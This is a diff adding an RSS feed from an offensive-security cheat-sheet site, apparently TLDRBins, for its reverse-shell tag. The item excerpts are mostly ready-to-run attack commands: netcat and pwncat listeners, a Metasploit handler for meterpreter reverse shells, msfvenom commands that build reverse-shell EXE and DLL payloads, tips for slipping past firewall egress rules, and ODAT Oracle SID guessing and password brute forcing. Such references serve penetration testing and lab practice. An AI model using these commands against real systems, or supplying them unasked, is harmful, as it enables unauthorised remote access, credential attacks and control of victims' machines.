@@ -1,0 +1,39 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Revshell on TLDRBins</title>
+    <link>https://tldrbins.github.io/@revshell/</link>
+    <description>Recent content in Revshell on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@revshell/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Listeners</title>
+      <link>https://tldrbins.github.io/listeners/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/listeners/</guid>
+      <description> nc rlwrap nc -lvnp 1337 ncat # Default listening on both ipv4 and ipv6 rlwrap ncat -lvnp 1337 pwncat Download pwncat&#xA;pwncat-cs -lp 1337 # After getting a connection (local) pwncat$ back </description>
+    </item>
+    <item>
+      <title>Metasploit Listener</title>
+      <link>https://tldrbins.github.io/metasploit_listener/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/metasploit_listener/</guid>
+      <description>Start a Metasploit Listener msfconsole -q use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 10.10.14.10 set lport 443 run Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules&#xA;If the shell die immediately, we can try to migrate it to another process # Create a automigrate.rc script run post/windows/manage/migrate msfconsole -q use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 10.10.14.10 set lport 443 set AutoRunScript multi_console_command -r automigrate.</description>
+    </item>
+    <item>
+      <title>Metasploit Shellcode</title>
+      <link>https://tldrbins.github.io/metasploit_shellcode/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/metasploit_shellcode/</guid>
+      <description>Generate Metasploit Shellcode Windows x64 EXE msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe Windows x86 EXE # Staged msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe # Stageless msfvenom -p windows/shell_reverse_tcp -a x86 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 EXITFUNC=thread &amp;gt; rev.exe Windows x64 DLL msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.dll Note: These will be flagged by AV Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules</description>
+    </item>
+    <item>
+      <title>Oracle Database</title>
+      <link>https://tldrbins.github.io/oracle/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/oracle/</guid>
+      <description>Tools sqlplus # Install sudo apt install oracle-instantclient-sqlplus # export LD_LIBRARY_PATH export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH} # Check sqlplus -V ODAT (Oracle Database Attacking Tool) Download ODAT&#xA;# Install sudo apt install odat # Check odat --version Enum # SID enum (You only need one) odat sidguesser -s 10.10.11.10 # User/Password brute force odat passwordguesser -s 10.10.11.10 -d &amp;lt;SID&amp;gt; --accounts-file accounts.txt # Run all checks with creds as sysdba odat all -s 10.</description>
+    </item>
+  </channel>
+</rss>
